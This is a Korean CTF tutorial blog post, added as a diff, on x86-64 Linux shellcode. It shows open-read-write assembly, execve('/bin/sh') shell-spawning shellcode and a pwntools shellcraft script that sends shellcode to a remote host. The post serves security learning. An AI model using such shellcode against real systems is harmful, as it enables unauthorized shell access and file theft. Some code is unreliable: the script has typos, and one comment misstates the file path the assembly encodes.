@@ -1,0 +1,182 @@
+---
+title: "shellcode"
+date: "2025-07-14T17:16:00+09:00"
+category: "ctf"
+originalCategory: "Security/Pwnable"
+source: "https://myinfosub.tistory.com/39"
+description: "shellcode? 셸을 얻기 위한 익스플로잇에 사용되는 어셈블리 코드 조각을 의미한다. 셸코드는 공격을 수행할 대상 아키텍처와 운영체제, 셸코드의 목적에 따라 다르게 작성된다. 아키텍처별로 자주 사용되는 셸코드를 공유, 제공하는 사이트도 있으나 시스템 환경을 완전히 반영하지는"
+layout: "post"
+tags: ["post"]
+permalink: "/posts/tistory/39/"
+render_with_liquid: false
+---
+<div class="tistory-content"><h2 style="color: #000000; text-align: start;" data-ke-size="size26">shellcode?</h2>
+<p data-ke-size="size16">셸을 얻기 위한 익스플로잇에 사용되는 어셈블리 코드 조각을 의미한다.</p>
+<p data-ke-size="size16">셸코드는 공격을 수행할 대상 아키텍처와 운영체제, 셸코드의 목적에 따라 다르게 작성된다.</p>
+<p data-ke-size="size16">아키텍처별로 자주 사용되는 셸코드를 공유, 제공하는 사이트도 있으나 시스템 환경을 완전히 반영하지는 못한다.</p>
+<p data-ke-size="size16">따라서 최적의 셸코드는 본인이 직접 작성 가능해야 한다.</p>
+<p data-ke-size="size16">&nbsp;</p>
+<p data-ke-size="size16">이 글에서는 여러 셸코드의 종류중 orw와 execve에 대하여 얘기하겠다.</p>
+<p data-ke-size="size16">&nbsp;</p>
+<h2 data-ke-size="size26">orw (Open-Read-Write)</h2>
+<p data-ke-size="size16">orw 셸코드는 파일을 열고, 읽은 뒤 화면에 출력해주는 코드이다.</p>
+<p data-ke-size="size16">CTF에서 flag를 찾기 위해 사용되는 경우가 많다.</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">&nbsp;</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">orw 셸코드 작성을 위해서는 아래의 syscall인 open, read, write를 알아야 한다.</p>
+<table style="background-color: oklch(0.9902 0.004 106.47); color: oklch(0.3039 0.04 213.68); text-align: start; border-collapse: collapse; width: 100%; height: 76px;" border="1" data-ke-align="alignLeft">
+<tbody>
+<tr style="height: 17px;">
+<td style="width: 24.5931%; text-align: center; height: 17px;"><b>syscall</b></td>
+<td style="width: 9.30232%; text-align: center; height: 17px;"><b>rax</b></td>
+<td style="width: 23.0233%; text-align: center; height: 17px;"><b>arg0 (rdi)</b></td>
+<td style="width: 20.4651%; text-align: center; height: 17px;"><b>arg1 (rsi)</b></td>
+<td style="width: 24.0698%; text-align: center; height: 17px;"><b>arg2 (rdx)</b></td>
+</tr>
+<tr style="height: 17px;">
+<td style="width: 24.5931%; height: 17px;">open(filename, flags, mode)</td>
+<td style="width: 9.30232%; height: 17px;">0x02</td>
+<td style="width: 23.0233%; height: 17px;">파일 경로</td>
+<td style="width: 20.4651%; height: 17px;">옵션</td>
+<td style="width: 24.0698%; height: 17px;">파일 생성시 접근 권한</td>
+</tr>
+<tr style="height: 21px;">
+<td style="height: 21px; width: 24.5931%;">read(fd, buf, count)</td>
+<td style="width: 9.30232%; height: 21px;">0x00</td>
+<td style="height: 21px; width: 23.0233%;">읽을 대상</td>
+<td style="height: 21px; width: 20.4651%;">저장할 메모리</td>
+<td style="height: 21px; width: 24.0698%;">읽을 바이트 수</td>
+</tr>
+<tr style="height: 21px;">
+<td style="height: 21px; width: 24.5931%;">write(fd, buf, count)</td>
+<td style="width: 9.30232%; height: 21px;">0x01</td>
+<td style="height: 21px; width: 23.0233%;">출력 대상</td>
+<td style="height: 21px; width: 20.4651%;">출력할 데이터</td>
+<td style="height: 21px; width: 24.0698%;">출력할 바이트 수</td>
+</tr>
+</tbody>
+</table>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">&nbsp;</p>
+<table style="background-color: oklch(0.9902 0.004 106.47); color: oklch(0.3039 0.04 213.68); text-align: start; border-collapse: collapse; width: 100%; height: 105px;" border="1" data-ke-align="alignLeft">
+<tbody>
+<tr style="height: 21px;">
+<td style="text-align: center; height: 21px;"><b>fd</b></td>
+<td style="text-align: center; height: 21px;"><b>의미</b></td>
+</tr>
+<tr style="height: 21px;">
+<td style="height: 21px;">0</td>
+<td style="height: 21px;">표준 입력(stdin)</td>
+</tr>
+<tr style="height: 21px;">
+<td style="height: 21px;">1</td>
+<td style="height: 21px;">표준 출력(stdout)</td>
+</tr>
+<tr style="height: 21px;">
+<td style="height: 21px;">2</td>
+<td style="height: 21px;">표준 에러(stderr)</td>
+</tr>
+<tr style="height: 21px;">
+<td style="height: 21px;">3 이상</td>
+<td style="height: 21px;">파일, 소켓 등 기타 자원</td>
+</tr>
+</tbody>
+</table>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">&nbsp;</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">open을 사용하고 read로 값을 읽으려는 경우 open 시스템 콜로 받아온 해당 파일값은 rax 레지스터에 저장하기에 fd에 'rax' 로 지정해주는 경우가 많다.</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">&nbsp;</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">open 예시 어셈블리 코드</p>
+<pre id="code_1752476437499" class="shell" data-ke-language="shell" data-ke-type="codeblock"><code>push 0x67
+mov rax, 0x616c662f706d742f 
+push rax
+mov rdi, rsp    ; rdi = "/example/flag"
+xor rsi, rsi    ; rsi = 0 ; RD_ONLY
+xor rdx, rdx    ; rdx = 0
+mov rax, 2      ; rax = 2 ; syscall_open
+syscall         ; open("/example/flag", RD_ONLY, NULL)</code></pre>
+<p data-ke-size="size16">&nbsp;</p>
+<p data-ke-size="size16">read 예시 어셈블리 코드</p>
+<pre id="code_1752476479848" class="shell" data-ke-language="shell" data-ke-type="codeblock"><code>mov rdi, rax      ; rdi = fd
+mov rsi, rsp
+sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
+mov rdx, 0x30     ; rdx = 0x30     ; len
+mov rax, 0x0      ; rax = 0        ; syscall_read
+syscall           ; read(fd, buf, 0x30)</code></pre>
+<p data-ke-size="size16">&nbsp;</p>
+<p data-ke-size="size16">write 예시 어셈블리 코드</p>
+<pre id="code_1752476504177" class="shell" data-ke-language="shell" data-ke-type="codeblock"><code>mov rdi, 1        ; rdi = 1 ; fd = stdout
+mov rax, 0x1      ; rax = 1 ; syscall_write
+syscall           ; write(fd, buf, 0x30)</code></pre>
+<p data-ke-size="size16">&nbsp;</p>
+<h2 data-ke-size="size26">셸코드 컴파일 및 실행</h2>
+<p data-ke-size="size16">대부분의 운영체제는 실행 파일 포맷을 규정하고 있다. 대표적으로 윈도우의 PE, 리눅스의 ELF 가 있다.</p>
+<p data-ke-size="size16">ELF는 헤더와 코드 그리고 기타 데이터로 구성되어 있다.</p>
+<p data-ke-size="size16">헤더에는 실행에 필요한 정보들이 적혀있고 코드에는 CPU를 위한 기계어 코드가 적혀있다.&nbsp;&nbsp;</p>
+<p data-ke-size="size16">&nbsp;</p>
+<p data-ke-size="size16">위에서 예시로 작성한 셸코드는 아스키로 작성한 어셈블리 코드이기에 기계어로 바꾸면 CPU가 이해는 하지만 ELF가 아니기에 리눅스에서 실행이 안된다.</p>
+<p data-ke-size="size16">이는 gcc 컴파일을 이용하여 ELF 형식으로 바꿀 수 있다.</p>
+<p data-ke-size="size16">&nbsp;</p>
+<p data-ke-size="size16">gcc에서는 인라인 어셈블리 __asm__() 또는 asm() 을 제공한다.</p>
+<p data-ke-size="size16">이 함수의 인자에 "문자열" 형태로 작성하면 해당 문자열을 그대로 기계어로 변환하여 바이너리의 텍스트 섹션에 삽입한다.</p>
+<p data-ke-size="size16">그래서 위에서 작성한 예시 코드들을 __asm__() 함수에 작성하고 gcc로 컴파일하여 운영체제의 형식에 맞게 바꿀 수 있다.</p>
+<pre id="code_1752477438611" class="shell" data-ke-language="shell" data-ke-type="codeblock"><code>$ gcc -o example_file example_file.c -masm=intel
+$ ./example_file
+flag{this_is_orw_example_file}</code></pre>
+<p data-ke-size="size16">&nbsp;</p>
+<h2 data-ke-size="size26">execve&nbsp;</h2>
+<p data-ke-size="size16"><b>execve</b> 라는 이름은 <b>execute + variable environment</b><span style="background-color: oklch(0.9902 0.004 106.47); color: oklch(0.3039 0.04 213.68); text-align: start;">의 약어로 </span><span style="background-color: oklch(0.9902 0.004 106.47); color: oklch(0.3039 0.04 213.68); text-align: start;">"새로운 프로그램을 실행(execute)하면서, 인자로 환경 변수(environment)도 함께 전달할 수 있는 시스템 콜" 을 의미한다.</span></p>
+<p data-ke-size="size16"><span style="color: oklch(0.3039 0.04 213.68);"><span style="background-color: oklch(0.9902 0.004 106.47);">이 execve 셸코드를 이용하면 서버의 셸을 획득하는 것도 가능하다.</span></span><span style="color: oklch(0.3039 0.04 213.68);"><span style="background-color: oklch(0.9902 0.004 106.47);">execve 셸코드 라는 말은 보통 서버의 셸을 획득하는 코드라는 의미로 사용한다.</span></span></p>
+<p data-ke-size="size16">&nbsp;</p>
+<p data-ke-size="size16"><span style="color: #003913;"><span style="background-color: oklch(0.9902 0.004 106.47);">execve 셸코드는 execve 시스템 콜만으로 구성된다.</span></span></p>
+<table style="background-color: oklch(0.9902 0.004 106.47); color: oklch(0.3039 0.04 213.68); text-align: start; border-collapse: collapse; width: 100%; height: 76px;" border="1" data-ke-align="alignLeft">
+<tbody>
+<tr style="height: 17px;">
+<td style="width: 21.1047%; height: 17px; text-align: center;"><b>syscall</b></td>
+<td style="width: 12.7907%; height: 17px; text-align: center;"><b>rax</b></td>
+<td style="width: 23.0233%; height: 17px; text-align: center;"><b>arg0 (rdi)</b></td>
+<td style="width: 20.4651%; height: 17px; text-align: center;"><b>arg1 (rsi)</b></td>
+<td style="width: 24.0698%; height: 17px;"><b>arg2 (rdx)</b></td>
+</tr>
+<tr>
+<td style="width: 21.1047%;">execve</td>
+<td style="width: 12.7907%;">0x3b</td>
+<td style="width: 23.0233%;">filename</td>
+<td style="width: 20.4651%;">argv</td>
+<td style="width: 24.0698%;">envp</td>
+</tr>
+</tbody>
+</table>
+<p style="color: #000000; text-align: start;" data-ke-size="size16">&nbsp;</p>
+<p style="color: #000000; text-align: start;" data-ke-size="size16">argv 는 실행파일에 넘겨줄 인자, envp는 환경변수 이다.</p>
+<p style="color: #000000; text-align: start;" data-ke-size="size16"><span style="color: #000000; text-align: start;">리눅스는 기본 실행 프로그램들이 bin에 저장되어 있다.</span></p>
+<p style="color: #000000; text-align: start;" data-ke-size="size16">셸을 실행하는 sh도 bin에 저장돼있기에 /bin/sh 만 실행시키면 셸을 획득할 수 있다.</p>
+<p style="color: #000000; text-align: start;" data-ke-size="size16">이를 위해서는 sh만 실행되면 되기에 filname 만 "/bin/sh" 로 설정하고 다른 값들은 전부 null로 설정해줘도 된다.&nbsp;&nbsp;</p>
+<pre id="code_1752479153916" class="shell" data-ke-language="shell" data-ke-type="codeblock"><code>execve(“/bin/sh”, null, null)</code></pre>
+<p data-ke-size="size16">&nbsp;</p>
+<p data-ke-size="size16">익스플로잇을 위해서는 위 코드의 실행을 목표로 셸코드를 구성하면 된다.</p>
+<p style="background-color: #ffffff; color: #3f3f3f; text-align: left;" data-ke-size="size16">&nbsp;</p>
+<h2 style="color: #000000; text-align: start;" data-ke-size="size26">&nbsp;</h2>
+<h2 style="color: #000000; text-align: start;" data-ke-size="size26">shellcraft</h2>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">pwntools에서 제공해주는 모듈로 shellcode 를 간단한 함수로 사용할 수 있도록 지원해준다.</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">&nbsp;</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">context 를 이용하여 서버의 운영체제와 아키택처를 지정해줄 수 있다.</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">context.update() 혹은 context.arch='amd64' 등의 방식이 존재한다.</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">&nbsp;</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">shellcraft.sh() 는 서버에서 shellcode 가 실행 될 때 /bin/sh를 실행시키도록 하여 공격자에게 쉘이 띄워지도록 한다. (execve)</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">orw 는 shellcraft.open(), .write(), .read() 로 가능하다.</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">&nbsp;</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">shellcraft로 생성한 shellcode는 어셈블리 코드로 구성돼있기에 실행 가능한 바이트 코드로 변환해줘야 한다.</p>
+<p style="color: #333333; text-align: start;" data-ke-size="size16">이를 위해 asm 함수를 사용한다. 반대의 일을 하는 disasm 함수도 존재한다.</p>
+<pre id="code_1752475850798" class="python" data-ke-type="codeblock" data-ke-language="python"><code>form pwn import *
+p=remote(HOST,POST)
+context.update(arch='amd64',os='linux',endian='little',log_level='debug')
+
+sc = ''
+sc += shellcraft.open('/home/example_file')      # rax ← fd
+sc += shellcraft.read('rax', 'rsp', 0x100)           # read(rax, rsp, 0x100)
+sc += shellcraft.write(1, 'rsp', 0x100)              # write(1, rsp, 0x100)
+
+p.sand(asm(sc))
+print(p.recvall())</code></pre>
+<p data-ke-size="size16">&nbsp;</p>
+<p data-ke-size="size16">셸코드를 사용하기 위해서는 대상의 아키텍처와 운영체제를 파악하는 것이 매우 중요하다.</p>
+<p data-ke-size="size16">공격하려는 대상의 아키텍처와 운영체제를 알고 싶을 때 만약 바이너리 파일을 가지고 있다면 파일 헤더에 대한 직접적인 분석, 디버거나 디스어셈블러같은 도구를 이용한 분석으로 매우 정확하게 알아낼 수 있다.</p>
+<p data-ke-size="size16">바이너리 파일이 없다면 <span style="background-color: oklch(0.9902 0.004 106.47); color: oklch(0.3039 0.04 213.68); text-align: start;">네트워크 스캐닝, 명령어 삽입, 소프트웨어 분석, 공개 정보 조사등의 여러 방법들로 아키텍처와 운영체제를 파악해야 한다.</span></p></div>
